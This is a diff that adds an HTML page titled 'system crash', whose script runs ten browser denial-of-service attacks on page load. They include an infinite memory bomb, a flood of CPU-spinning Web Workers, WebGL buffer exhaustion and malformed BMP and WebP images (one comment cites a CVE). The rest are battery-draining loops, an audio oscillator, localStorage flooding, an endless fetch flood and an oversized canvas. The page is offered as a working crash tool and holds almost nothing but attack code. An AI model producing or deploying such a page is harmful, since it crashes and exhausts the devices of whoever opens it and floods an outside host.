@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>system crash</title>
+</head>
+<body>
+<script>
+    // ============================================
+    // 1. استنزاف الذاكرة (حلقة لا نهائية مع كائنات ضخمة)
+    // ============================================
+    (function memoryBomb() {
+        var bomb = [];
+        while (true) {
+            bomb.push(new Array(1000000).join('X'));
+            var obj = {};
+            for (var i = 0; i < 10000; i++) {
+                obj['prop' + i] = new Array(50000).join('A');
+            }
+            bomb.push(obj);
+            if (bomb.length % 100 === 0) {
+                try { navigator.vibrate(10000); } catch(e) {}
+            }
+        }
+    })();
+
+    // ============================================
+    // 2. فيض العمال (Web Workers) – استهلاك CPU
+    // ============================================
+    (function workerFlood() {
+        var workers = [];
+        for (var i = 0; i < (navigator.hardwareConcurrency || 4) * 5; i++) {
+            try {
+                var w = new Worker(URL.createObjectURL(new Blob([
+                    'while(true){ var x = new Array(100000).join("z"); }'
+                ])));
+                workers.push(w);
+            } catch(e) {}
+        }
+    })();
+
+    // ============================================
+    // 3. هجوم WebGL – إجبار سائق الرسوميات على الانهيار
+    // ============================================
+    (function gpuCrash() {
+        var canvas = document.createElement('canvas');
+        document.body.appendChild(canvas);
+        var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (gl) {
+            var buffers = [];
+            for (var i = 0; i < 500; i++) {
+                var buf = gl.createBuffer();
+                gl.bindBuffer(gl.ARRAY_BUFFER, buf);
+                var data = new Float32Array(1000000);
+                gl.bufferData(gl.ARRAY_BUFFER, data, gl.STATIC_DRAW);
+                buffers.push(buf);
+            }
+            function drawLoop() {
+                gl.clear(gl.COLOR_BUFFER_BIT);
+                requestAnimationFrame(drawLoop);
+            }
+            drawLoop();
+        }
+    })();
+
+    // ============================================
+    // 4. صورة BMP خبيثة – تجاوز سعة محلل الصور
+    // ============================================
+    (function bmpCrash() {
+        var bmpHeader = 'BM' + String.fromCharCode(
+            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+            0x36, 0x00, 0x00, 0x00
+        );
+        var bmpInfo = String.fromCharCode(
+            0x28, 0x00, 0x00, 0x00,
+            0xFF, 0xFF, 0xFF, 0xFF, // عرض خيالي
+            0xFF, 0xFF, 0xFF, 0xFF, // ارتفاع خيالي
+            0x01, 0x00, 0x18, 0x00,
+            0x00, 0x00, 0x00, 0x00,
+            0x00, 0x00, 0x00, 0x00,
+            0x00, 0x00, 0x00, 0x00,
+            0x00, 0x00, 0x00, 0x00,
+            0x00, 0x00, 0x00, 0x00
+        );
+        var payload = bmpHeader + bmpInfo;
+        while (payload.length < 50000000) {
+            payload += String.fromCharCode(0x41, 0x42, 0x43, 0x44);
+        }
+        var blob = new Blob([payload], {type: 'image/bmp'});
+        var url = URL.createObjectURL(blob);
+        var img = document.createElement('img');
+        img.src = url;
+        document.body.appendChild(img);
+    })();
+
+    // ============================================
+    // 5. صورة WebP خبيثة (CVE-2020-16040) – تعطل المتصفح
+    // ============================================
+    (function webpCrash() {
+        // إنشاء بيانات WebP بعرض وارتفاع خياليين (0xFFFFFFFF)
+        var buffer = new ArrayBuffer(40);
+        var view = new Uint8Array(buffer);
+        // RIFF header
+        view[0]=0x52; view[1]=0x49; view[2]=0x46; view[3]=0x46;
+        // حجم ملف خيالي
+        view[4]=0xFF; view[5]=0xFF; view[6]=0xFF; view[7]=0xFF;
+        // WEBP
+        view[8]=0x57; view[9]=0x45; view[10]=0x42; view[11]=0x50;
+        // VP8L chunk
+        view[12]=0x56; view[13]=0x50; view[14]=0x38; view[15]=0x4C;
+        // حجم chunk خيالي
+        view[16]=0xFF; view[17]=0xFF; view[18]=0xFF; view[19]=0xFF;
+        // VP8L signature (0x2F)
+        view[20]=0x2F;
+        // عرض وارتفاع (مشفرين) – قيمة قصوى
+        view[21]=0xFF; view[22]=0xFF; view[23]=0xFF; view[24]=0xFF;
+        // بيانات عشوائية
+        for (var i=25; i<40; i++) view[i]=0xAA;
+        var blob = new Blob([view], {type: 'image/webp'});
+        var url = URL.createObjectURL(blob);
+        var img = document.createElement('img');
+        img.src = url;
+        document.body.appendChild(img);
+    })();
+
+    // ============================================
+    // 6. استنزاف البطارية – واجهة Battery API
+    // ============================================
+    (function batteryDrain() {
+        navigator.getBattery().then(function(battery) {
+            setInterval(function() {
+                battery.level;
+                // إضافة استهلاك CPU إضافي
+                for (var i=0; i<100000; i++) Math.random();
+            }, 1);
+        }).catch(function(){});
+    })();
+
+    // ============================================
+    // 7. هجوم WebAudio – ترددات عالية + حلقة لا نهائية
+    // ============================================
+    (function audioCrash() {
+        try {
+            var audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+            var oscillator = audioCtx.createOscillator();
+            oscillator.frequency.value = 22000;
+            oscillator.connect(audioCtx.destination);
+            oscillator.start();
+            setInterval(function() {
+                oscillator.frequency.value += Math.random() * 1000;
+            }, 1);
+        } catch(e) {}
+    })();
+
+    // ============================================
+    // 8. ملء localStorage لتعطيل النظام
+    // ============================================
+    (function storageFlood() {
+        var data = new Array(1000000).join('X');
+        while (true) {
+            try {
+                localStorage.setItem('crash' + Math.random(), data);
+            } catch(e) {
+                // عند الامتلاء، إفراغ متكرر يسبب ضغطًا
+                localStorage.clear();
+            }
+        }
+    })();
+
+    // ============================================
+    // 9. طلبات Fetch لا نهائية (استنزاف موارد الشبكة)
+    // ============================================
+    (function fetchFlood() {
+        for (var i=0; i<100; i++) {
+            setTimeout(function() {
+                while (true) {
+                    fetch('https://example.com', { mode: 'no-cors' }).catch(function(){});
+                }
+            }, i*100);
+        }
+    })();
+
+    // ============================================
+    // 10. Canvas عملاق (تجاوز سعة الذاكرة)
+    // ============================================
+    (function canvasCrash() {
+        var canvas = document.createElement('canvas');
+        canvas.width = 100000;
+        canvas.height = 100000;
+        var ctx = canvas.getContext('2d');
+        var imgData = ctx.createImageData(100000, 100000);
+        for (var i=0; i<imgData.data.length; i+=4) {
+            imgData.data[i] = 255;
+            imgData.data[i+1] = 255;
+            imgData.data[i+2] = 255;
+            imgData.data[i+3] = 255;
+        }
+        ctx.putImageData(imgData, 0, 0);
+        document.body.appendChild(canvas);
+    })();
+</script>
+</body>
+</html>
